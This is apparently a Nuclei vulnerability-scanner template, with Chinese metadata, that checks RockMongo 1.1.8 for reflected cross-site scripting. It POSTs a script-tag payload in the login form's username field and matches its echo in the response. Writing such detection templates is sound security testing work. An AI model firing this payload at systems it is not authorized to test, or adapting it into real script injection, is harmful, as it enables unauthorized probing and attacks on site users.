id: rockmongo-xss

info:
  name: RockMongo 1.1.8 - 跨站脚本漏洞
  author: pikpikcu
  severity: high
  description: RockMongo 1.1.8 - 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  reference:
    - https://packetstormsecurity.com/files/136658/RockMongo-1.1.8-Cross-Site-Request-Forgery-Cross-Site-Scripting.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  metadata:
    max-request: 1
  tags: rockmongo,xss,packetstorm,vuln

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?action=login.index"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "more=0&host=0&username=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=&db=&lang=en_us&expire=3"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"><script>alert(document.domain)</script>'
        part: body

      - type: status
        status:
          - 200

      - type: word
        words:
          - 'Content-Type: text/html'
        part: header
